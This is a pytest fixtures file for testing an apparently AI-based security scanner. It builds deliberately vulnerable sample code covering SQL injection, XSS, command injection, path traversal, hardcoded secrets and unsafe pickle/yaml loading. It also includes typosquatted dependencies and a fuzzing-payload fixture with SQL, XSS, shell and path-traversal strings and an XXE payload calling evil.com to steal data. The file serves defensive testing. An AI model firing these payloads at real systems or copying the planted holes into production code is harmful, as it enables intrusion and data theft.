"""
Shared fixtures for integration tests
"""

import json
import os
from collections.abc import Generator
from pathlib import Path

import pytest


@pytest.fixture
def sample_vulnerable_repo(tmp_path: Path) -> Generator[Path, None, None]:
    """Create a repository with known vulnerabilities for testing"""
    repo_dir = tmp_path / "vulnerable_repo"
    repo_dir.mkdir()

    # SQL Injection vulnerabilities
    (repo_dir / "sql_injection.py").write_text(
        '''
"""Module with SQL injection vulnerabilities"""

def search_users(name):
    # VULNERABLE: String interpolation in SQL
    query = f"SELECT * FROM users WHERE name = '{name}'"
    return db.execute(query)

def get_user_by_id(user_id):
    # VULNERABLE: String formatting in SQL
    query = "SELECT * FROM users WHERE id = %s" % user_id
    return db.execute(query)

def login(username, password):
    # VULNERABLE: Concatenation in SQL
    query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
    return db.execute(query)
'''
    )

    # XSS vulnerabilities
    (repo_dir / "xss_vuln.js").write_text(
        """
// Module with XSS vulnerabilities

function displayUserMessage(msg) {
    // VULNERABLE: Direct innerHTML assignment
    document.getElementById('output').innerHTML = msg;
}

function showNotification(text) {
    // VULNERABLE: document.write with user input
    document.write(text);
}

function renderTemplate(data) {
    // VULNERABLE: eval with user data
    eval("var result = " + data);
    return result;
}
"""
    )

    # Command Injection vulnerabilities
    (repo_dir / "command_injection.py").write_text(
        '''
"""Module with command injection vulnerabilities"""
import os
import subprocess

def ping_host(hostname):
    # VULNERABLE: os.system with user input
    os.system(f"ping -c 1 {hostname}")

def run_script(script_name):
    # VULNERABLE: shell=True with user input
    subprocess.call("bash " + script_name, shell=True)

def check_file(filename):
    # VULNERABLE: os.popen with user input
    output = os.popen(f"cat {filename}").read()
    return output
'''
    )

    # Path Traversal vulnerability
    (repo_dir / "path_traversal.py").write_text(
        '''
"""Module with path traversal vulnerability"""

def read_user_file(filename):
    # VULNERABLE: No path validation
    with open(f"/data/{filename}", 'r') as f:
        return f.read()

def serve_file(filepath):
    # VULNERABLE: Direct file access
    return open(filepath).read()
'''
    )

    # Hardcoded credentials
    (repo_dir / "credentials.py").write_text(
        '''
"""Module with hardcoded credentials"""

# VULNERABLE: Hardcoded credentials
DATABASE_PASSWORD = "supersecret123"
API_KEY = "sk-1234567890abcdef"
AWS_SECRET = "aws_secret_key_12345"

def connect_to_db():
    return db.connect(password="hardcoded_password")
'''
    )

    # Insecure deserialization
    (repo_dir / "deserialization.py").write_text(
        '''
"""Module with insecure deserialization"""
import pickle
import yaml

def load_user_data(data):
    # VULNERABLE: pickle.loads on untrusted data
    return pickle.loads(data)

def parse_config(yaml_str):
    # VULNERABLE: yaml.load without Loader
    return yaml.load(yaml_str)
'''
    )

    # Safe file for comparison
    (repo_dir / "safe_module.py").write_text(
        '''
"""Module with safe code"""

def safe_function(data):
    """Safe data processing"""
    cleaned = data.strip().lower()
    return cleaned.capitalize()

def validate_input(user_input):
    """Proper input validation"""
    allowed_chars = set('abcdefghijklmnopqrstuvwxyz0123456789')
    return all(c in allowed_chars for c in user_input.lower())
'''
    )

    # Package metadata
    (repo_dir / "package.json").write_text(
        json.dumps(
            {
                "name": "vulnerable-test-app",
                "version": "1.0.0",
                "dependencies": {"express": "^4.17.1", "mysql": "^2.18.1"},
            }
        )
    )

    # README
    (repo_dir / "README.md").write_text(
        """# Test Vulnerable Repository

This repository contains intentional security vulnerabilities for testing purposes.

## Vulnerabilities Included:
- SQL Injection
- XSS
- Command Injection
- Path Traversal
- Hardcoded Credentials
- Insecure Deserialization

**DO NOT USE IN PRODUCTION**
"""
    )

    yield repo_dir


@pytest.fixture
def sample_safe_repo(tmp_path: Path) -> Generator[Path, None, None]:
    """Create a repository with safe, well-written code"""
    repo_dir = tmp_path / "safe_repo"
    repo_dir.mkdir()

    # Safe database module
    (repo_dir / "database.py").write_text(
        '''
"""Safe database module with parameterized queries"""
import sqlite3

def search_users(name: str):
    """Safe user search with parameterized query"""
    query = "SELECT * FROM users WHERE name = ?"
    return db.execute(query, (name,))

def login(username: str, password: str):
    """Safe login with prepared statement"""
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    return db.execute(query, (username, password))
'''
    )

    # Safe web module
    (repo_dir / "web_utils.py").write_text(
        '''
"""Safe web utilities with proper escaping"""
import html

def display_message(msg: str):
    """Safe display with HTML escaping"""
    escaped = html.escape(msg)
    return f"<div>{escaped}</div>"

def render_template(data: dict):
    """Safe template rendering"""
    return json.dumps(data)
'''
    )

    # Safe utilities
    (repo_dir / "utils.py").write_text(
        '''
"""Safe utility functions"""
from pathlib import Path

def read_file_safe(filename: str):
    """Safe file reading with path validation"""
    base_path = Path("/data")
    full_path = (base_path / filename).resolve()

    if not str(full_path).startswith(str(base_path)):
        raise ValueError("Path traversal detected")

    with open(full_path, 'r') as f:
        return f.read()
'''
    )

    (repo_dir / "README.md").write_text("# Safe Repository\nWell-written secure code")

    yield repo_dir


@pytest.fixture
def mock_api_key() -> str:
    """Provide test API key"""
    return os.getenv("ANTHROPIC_API_KEY", "sk-ant-test-key-12345")


@pytest.fixture
def mock_config() -> dict:
    """Mock configuration for tests"""
    return {
        "ai_provider": "anthropic",
        "anthropic_api_key": "test-key-12345",
        "model": "claude-sonnet-4-5-20250929",
        "multi_agent_mode": "single",
        "enable_threat_modeling": False,
        "enable_sandbox_validation": False,
        "foundation_sec_enabled": False,
        "max_files": "20",
        "max_tokens": "4000",
        "cost_limit": "1.0",
        "max_file_size": "50000",
    }


@pytest.fixture
def phase1_config(mock_api_key: str) -> dict:
    """Configuration with all Phase 1 features enabled"""
    return {
        "ai_provider": "anthropic",
        "anthropic_api_key": mock_api_key,
        "model": "claude-sonnet-4-5-20250929",
        "multi_agent_mode": "sequential",
        "enable_threat_modeling": True,
        "enable_sandbox_validation": True,
        "foundation_sec_enabled": False,  # Don't require model download
        "max_files": "10",
        "max_tokens": "2000",
        "cost_limit": "2.0",
    }


@pytest.fixture
def foundation_sec_config() -> dict:
    """Configuration for Foundation-Sec-8B provider"""
    return {
        "ai_provider": "foundation-sec",
        "foundation_sec_enabled": True,
        "enable_threat_modeling": True,
        "enable_sandbox_validation": False,
        "max_files": "10",
        "max_tokens": "2000",
    }


@pytest.fixture
def sample_findings() -> list:
    """Sample security findings for testing"""
    return [
        {
            "category": "security",
            "severity": "critical",
            "title": "SQL Injection vulnerability",
            "description": "User input is directly concatenated into SQL query without sanitization",
            "file": "sql_injection.py",
            "line": 5,
            "code": "query = f\"SELECT * FROM users WHERE name = '{name}'\"",
            "recommendation": "Use parameterized queries with placeholders instead of string interpolation",
            "cwe": "CWE-89",
            "owasp": "A03:2021 - Injection",
        },
        {
            "category": "security",
            "severity": "high",
            "title": "Cross-Site Scripting (XSS)",
            "description": "User input assigned directly to innerHTML allows script execution",
            "file": "xss_vuln.js",
            "line": 4,
            "code": "document.getElementById('output').innerHTML = msg;",
            "recommendation": "Use textContent instead of innerHTML, or sanitize HTML input",
            "cwe": "CWE-79",
            "owasp": "A03:2021 - Injection",
        },
        {
            "category": "security",
            "severity": "critical",
            "title": "Command Injection",
            "description": "User input passed to os.system allows arbitrary command execution",
            "file": "command_injection.py",
            "line": 6,
            "code": 'os.system(f"ping -c 1 {hostname}")',
            "recommendation": "Use subprocess with argument list instead of shell commands",
            "cwe": "CWE-78",
            "owasp": "A03:2021 - Injection",
        },
        {
            "category": "security",
            "severity": "high",
            "title": "Hardcoded Credentials",
            "description": "Database password hardcoded in source code",
            "file": "credentials.py",
            "line": 4,
            "code": 'DATABASE_PASSWORD = "supersecret123"',
            "recommendation": "Use environment variables or secure credential management",
            "cwe": "CWE-798",
            "owasp": "A07:2021 - Identification and Authentication Failures",
        },
        {
            "category": "security",
            "severity": "medium",
            "title": "Path Traversal",
            "description": "File path not validated, allows directory traversal",
            "file": "path_traversal.py",
            "line": 4,
            "code": 'with open(f"/data/{filename}", "r") as f:',
            "recommendation": "Validate and sanitize file paths, use Path.resolve()",
            "cwe": "CWE-22",
            "owasp": "A01:2021 - Broken Access Control",
        },
    ]


@pytest.fixture
def sample_threat_model() -> dict:
    """Sample threat model for testing"""
    return {
        "version": "1.0",
        "repository": "test-repo",
        "generated_at": "2025-01-01T00:00:00Z",
        "attack_surface": {
            "entry_points": ["Web API endpoints", "Database connections", "File upload functionality"],
            "external_dependencies": ["npm packages", "Python libraries", "External APIs"],
            "authentication_methods": ["JWT tokens", "Session cookies", "API keys"],
            "data_stores": ["PostgreSQL database", "Redis cache", "File system"],
        },
        "trust_boundaries": [
            {
                "name": "Public Internet / Application",
                "trust_level": "untrusted",
                "description": "External users accessing web application",
            },
            {
                "name": "Application / Database",
                "trust_level": "trusted",
                "description": "Internal communication between app and database",
            },
        ],
        "assets": [
            {
                "name": "User credentials",
                "sensitivity": "critical",
                "description": "Usernames, passwords, authentication tokens",
            },
            {"name": "Personal data", "sensitivity": "high", "description": "User profile information, PII"},
            {"name": "Application code", "sensitivity": "medium", "description": "Source code and configuration"},
        ],
        "threats": [
            {
                "id": "THREAT-001",
                "name": "SQL Injection Attack",
                "category": "injection",
                "likelihood": "high",
                "impact": "critical",
                "affected_components": ["database", "api"],
                "description": "Attacker injects SQL code through user inputs",
                "mitigation": "Use parameterized queries and input validation",
            },
            {
                "id": "THREAT-002",
                "name": "Cross-Site Scripting (XSS)",
                "category": "injection",
                "likelihood": "high",
                "impact": "high",
                "affected_components": ["web", "frontend"],
                "description": "Attacker injects malicious scripts into web pages",
                "mitigation": "Implement output encoding and Content Security Policy",
            },
            {
                "id": "THREAT-003",
                "name": "Authentication Bypass",
                "category": "authentication",
                "likelihood": "medium",
                "impact": "critical",
                "affected_components": ["authentication", "api"],
                "description": "Attacker bypasses authentication mechanisms",
                "mitigation": "Implement robust authentication and authorization",
            },
        ],
        "security_objectives": [
            "Protect user credentials and personal data",
            "Prevent unauthorized access to system resources",
            "Maintain data integrity and availability",
            "Detect and respond to security incidents",
        ],
    }


@pytest.fixture(autouse=True)
def reset_environment():
    """Reset environment variables before each test"""
    original_env = os.environ.copy()
    yield
    # Restore original environment
    os.environ.clear()
    os.environ.update(original_env)


@pytest.fixture
def temp_output_dir(tmp_path: Path) -> Generator[Path, None, None]:
    """Create temporary directory for output files"""
    output_dir = tmp_path / ".argus"
    output_dir.mkdir()
    yield output_dir


# ========== NEW E2E TEST FIXTURES ==========


@pytest.fixture
def sample_api_endpoints(tmp_path: Path) -> Generator[Path, None, None]:
    """Create sample API endpoints with vulnerabilities"""
    api_dir = tmp_path / "api"
    api_dir.mkdir()

    # Flask API with vulnerabilities
    (api_dir / "flask_api.py").write_text(
        '''
"""Flask API with OWASP API Top 10 vulnerabilities"""
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/users/<user_id>')
def get_user(user_id):
    """BOLA vulnerability - no authorization check"""
    query = f"SELECT * FROM users WHERE id = {user_id}"
    return jsonify({"user": query})

@app.route('/api/login', methods=['POST'])
def login():
    """Broken authentication - weak password validation"""
    username = request.json.get('username')
    password = request.json.get('password')
    if len(password) < 3:  # Weak validation
        return jsonify({"token": "weak-token-123"})
    return jsonify({"error": "Invalid"})

@app.route('/api/fetch')
def fetch_url():
    """SSRF vulnerability"""
    url = request.args.get('url')
    import requests
    response = requests.get(url)  # No validation
    return response.text

@app.route('/api/admin')
def admin():
    """Security misconfiguration - debug enabled"""
    if app.debug:  # Debug should be disabled in production
        return jsonify({"debug_info": "sensitive data"})
'''
    )

    yield api_dir


@pytest.fixture
def sample_openapi_spec(tmp_path: Path) -> Generator[Path, None, None]:
    """Create sample OpenAPI/Swagger specification"""
    spec_file = tmp_path / "openapi.yaml"
    spec_content = {
        "openapi": "3.0.0",
        "info": {"title": "Test API", "version": "1.0.0"},
        "servers": [{"url": "http://api.example.com"}],
        "paths": {
            "/api/users/{id}": {
                "get": {
                    "summary": "Get user by ID",
                    "parameters": [
                        {
                            "name": "id",
                            "in": "path",
                            "required": True,
                            "schema": {"type": "integer"},
                        }
                    ],
                    "responses": {"200": {"description": "Success"}},
                }
            },
            "/api/login": {
                "post": {
                    "summary": "User login",
                    "requestBody": {
                        "content": {
                            "application/json": {
                                "schema": {
                                    "type": "object",
                                    "properties": {
                                        "username": {"type": "string"},
                                        "password": {"type": "string"},
                                    },
                                }
                            }
                        }
                    },
                    "responses": {"200": {"description": "Login successful"}},
                }
            },
            "/api/search": {
                "get": {
                    "summary": "Search endpoint",
                    "parameters": [
                        {"name": "q", "in": "query", "schema": {"type": "string"}}
                    ],
                    "responses": {"200": {"description": "Search results"}},
                }
            },
        },
    }
    spec_file.write_text(json.dumps(spec_content, indent=2))
    yield spec_file


@pytest.fixture
def sample_supply_chain_packages(tmp_path: Path) -> Generator[Path, None, None]:
    """Create sample dependency files with supply chain threats"""
    repo_dir = tmp_path / "supply_chain_test"
    repo_dir.mkdir()

    # package.json with typosquatting
    (repo_dir / "package.json").write_text(
        json.dumps(
            {
                "name": "test-app",
                "version": "1.0.0",
                "dependencies": {
                    "express": "^4.17.1",  # Legitimate
                    "reakt": "^1.0.0",  # Typosquatting: react
                    "lodahs": "^1.0.0",  # Typosquatting: lodash
                    "axios": "^0.21.1",  # Legitimate
                },
            }
        )
    )

    # requirements.txt with typosquatting
    (repo_dir / "requirements.txt").write_text(
        """django==3.2.0
reqeusts==2.28.0
numpy==1.21.0
python-dateutil==2.8.2
"""
    )

    # go.mod with suspicious package
    (repo_dir / "go.mod").write_text(
        """module example.com/app
go 1.19
require (
    github.com/gin-gonic/gin v1.7.0
    github.com/suspicious-package/malware v1.0.0
)
"""
    )

    yield repo_dir


@pytest.fixture
def sample_fuzzing_target(tmp_path: Path) -> Generator[Path, None, None]:
    """Create sample fuzzing target with vulnerabilities"""
    target_file = tmp_path / "fuzz_target.py"
    target_file.write_text(
        '''
"""Fuzzing target with multiple vulnerabilities"""

def parse_input(data: str) -> str:
    """Parse user input with multiple vulnerabilities"""

    # SQL Injection
    if "'" in data and ("OR" in data or "UNION" in data):
        raise ValueError("SQL injection detected")

    # XSS
    if "<script>" in data or "javascript:" in data:
        raise ValueError("XSS detected")

    # Command Injection
    if ";" in data or "|" in data or "`" in data:
        raise RuntimeError("Command injection detected")

    # Buffer Overflow (simulated)
    if len(data) > 1000:
        raise MemoryError("Buffer overflow")

    # Path Traversal
    if "../" in data or "..\\" in data:
        raise ValueError("Path traversal detected")

    # XXE (simulated)
    if "<!ENTITY" in data and "SYSTEM" in data:
        raise ValueError("XXE detected")

    return f"Processed: {data}"


def parse_json_deeply(data: str, depth: int = 0):
    """JSON parser with recursion vulnerability"""
    import json
    parsed = json.loads(data)

    if depth > 50:
        raise RecursionError("Maximum recursion depth exceeded")

    if isinstance(parsed, dict):
        for value in parsed.values():
            if isinstance(value, dict):
                parse_json_deeply(json.dumps(value), depth + 1)

    return parsed
'''
    )
    yield target_file


@pytest.fixture
def sample_dast_targets() -> list:
    """Sample DAST targets for testing"""
    return [
        {
            "url": "http://testapp.local/api/users/1",
            "method": "GET",
            "endpoint": "/api/users/{id}",
            "vuln_type": "sql-injection",
        },
        {
            "url": "http://testapp.local/api/search?q=test",
            "method": "GET",
            "endpoint": "/api/search",
            "vuln_type": "xss",
        },
        {
            "url": "http://testapp.local/api/fetch?url=http://internal",
            "method": "GET",
            "endpoint": "/api/fetch",
            "vuln_type": "ssrf",
        },
        {
            "url": "http://testapp.local/api/upload",
            "method": "POST",
            "endpoint": "/api/upload",
            "vuln_type": "file-upload",
        },
    ]


@pytest.fixture
def mock_llm_response() -> dict:
    """Mock LLM response for testing"""
    return {
        "analysis": "This finding appears to be a SQL injection vulnerability due to string concatenation in the query.",
        "severity": "critical",
        "confidence": 0.95,
        "is_false_positive": False,
        "recommendation": "Use parameterized queries to prevent SQL injection",
        "fixed_code": 'query = "SELECT * FROM users WHERE id = ?"',
        "test_cases": [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "1' UNION SELECT NULL--",
        ],
    }


@pytest.fixture
def sample_correlation_data() -> dict:
    """Sample SAST-DAST correlation data"""
    return {
        "sast_findings": [
            {
                "id": "sast-001",
                "type": "sql-injection",
                "severity": "high",
                "file": "api/users.py",
                "line": 42,
                "endpoint": "/api/users/{id}",
                "confidence": 0.7,
            },
            {
                "id": "sast-002",
                "type": "xss",
                "severity": "medium",
                "file": "api/search.py",
                "line": 15,
                "endpoint": "/api/search",
                "confidence": 0.6,
            },
        ],
        "dast_findings": [
            {
                "id": "dast-001",
                "type": "sql-injection",
                "severity": "critical",
                "url": "http://api.example.com/api/users/1",
                "matched_at": "/api/users/1",
                "poc": "curl 'http://api.example.com/api/users/1%27'",
            }
        ],
        "expected_correlations": [
            {
                "sast_id": "sast-001",
                "dast_id": "dast-001",
                "is_verified": True,
                "confidence": 0.95,
            }
        ],
    }


@pytest.fixture
def sample_test_generation_data() -> dict:
    """Sample data for test generation"""
    return {
        "findings": [
            {
                "id": "test-gen-001",
                "type": "sql-injection",
                "severity": "critical",
                "file": "app/db.py",
                "line": 42,
                "code": "query = f'SELECT * FROM users WHERE id = {user_id}'",
                "language": "python",
                "framework": "flask",
            },
            {
                "id": "test-gen-002",
                "type": "xss",
                "severity": "high",
                "file": "frontend/app.js",
                "line": 15,
                "code": "element.innerHTML = userInput;",
                "language": "javascript",
                "framework": "react",
            },
        ],
        "expected_tests": {
            "python": ["def test_sql_injection_", "assert", "pytest"],
            "javascript": ["test(", "expect(", "it("],
        },
    }


@pytest.fixture
def sample_api_security_findings() -> list:
    """Sample API security findings (OWASP API Top 10)"""
    return [
        {
            "finding_id": "api-bola-001",
            "owasp_category": "API1:2023",
            "vulnerability_type": "BOLA",
            "severity": "CRITICAL",
            "title": "Broken Object Level Authorization",
            "description": "Endpoint allows access to other users' data without authorization check",
            "endpoint_path": "/api/users/{id}",
            "http_method": "GET",
            "file_path": "api/users.py",
            "line_number": 25,
        },
        {
            "finding_id": "api-auth-001",
            "owasp_category": "API2:2023",
            "vulnerability_type": "Broken Authentication",
            "severity": "HIGH",
            "title": "Weak Password Validation",
            "description": "Password requirements are too weak (min 3 characters)",
            "endpoint_path": "/api/login",
            "http_method": "POST",
            "file_path": "api/auth.py",
            "line_number": 42,
        },
        {
            "finding_id": "api-ssrf-001",
            "owasp_category": "API7:2023",
            "vulnerability_type": "SSRF",
            "severity": "HIGH",
            "title": "Server-Side Request Forgery",
            "description": "Endpoint fetches user-provided URLs without validation",
            "endpoint_path": "/api/fetch",
            "http_method": "GET",
            "file_path": "api/fetch.py",
            "line_number": 15,
        },
    ]


@pytest.fixture
def sample_fuzzing_payloads() -> dict:
    """Sample fuzzing payloads by vulnerability type"""
    return {
        "sql_injection": [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin'--",
            "1' AND '1'='1",
        ],
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "'><script>alert(1)</script>",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "&& id",
            "|| pwd",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        "buffer_overflow": [
            "A" * 1000,
            "A" * 10000,
            "A" * 100000,
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
        ],
    }


@pytest.fixture
def complete_workflow_project(tmp_path: Path) -> Generator[Path, None, None]:
    """
    Create a complete project structure for end-to-end workflow testing
    Includes API code, dependencies, and vulnerabilities across the stack
    """
    project_dir = tmp_path / "complete_project"
    project_dir.mkdir()

    # Backend API
    api_dir = project_dir / "api"
    api_dir.mkdir()
    (api_dir / "users.py").write_text(
        '''
"""User API with vulnerabilities"""
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/users/<user_id>')
def get_user(user_id):
    # SQL Injection
    query = f"SELECT * FROM users WHERE id = {user_id}"
    return jsonify({"query": query})

@app.route('/api/search')
def search():
    # XSS
    term = request.args.get('q')
    return f"<div>Results: {term}</div>"
'''
    )

    # Frontend
    frontend_dir = project_dir / "frontend"
    frontend_dir.mkdir()
    (frontend_dir / "app.js").write_text(
        """
function displayUser(data) {
    // XSS vulnerability
    document.getElementById('user').innerHTML = data.name;
}

function fetchUrl(url) {
    // SSRF potential
    fetch(url).then(r => r.text());
}
"""
    )

    # Dependencies
    (project_dir / "package.json").write_text(
        json.dumps(
            {
                "name": "complete-app",
                "dependencies": {
                    "express": "^4.17.1",
                    "react": "^18.0.0",
                    "axios": "^0.21.1",
                },
            }
        )
    )

    (project_dir / "requirements.txt").write_text(
        "flask==2.0.1\ndjango==3.2.0\nrequests==2.28.0\n"
    )

    # OpenAPI spec
    (project_dir / "openapi.yaml").write_text(
        json.dumps(
            {
                "openapi": "3.0.0",
                "info": {"title": "Complete App API", "version": "1.0.0"},
                "paths": {
                    "/api/users/{id}": {
                        "get": {
                            "parameters": [{"name": "id", "in": "path"}],
                            "responses": {"200": {"description": "OK"}},
                        }
                    }
                },
            }
        )
    )

    yield project_dir
